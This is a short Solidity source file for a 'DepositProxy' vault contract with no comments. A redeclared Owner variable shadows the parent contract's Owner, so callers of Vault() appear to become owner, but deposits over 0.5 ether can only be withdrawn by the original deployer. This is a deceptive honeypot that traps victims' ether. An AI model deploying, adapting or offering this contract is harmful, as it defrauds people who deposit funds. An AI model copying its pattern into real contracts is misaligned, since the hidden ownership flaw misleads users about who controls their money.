pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable { 
        assembly { 
            let freemem_start := mload(0x40)
            calldatacopy(freemem_start, 0, calldatasize)
            let result := call(gas, target, callvalue, freemem_start, calldatasize, 0, 0)
            if iszero(result) { revert(0, 0) }
        }
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            assembly {
                let result := call(gas, caller, amount, 0, 0, 0, 0)
                if iszero(result) { revert(0, 0) }
            }
        }
    }
}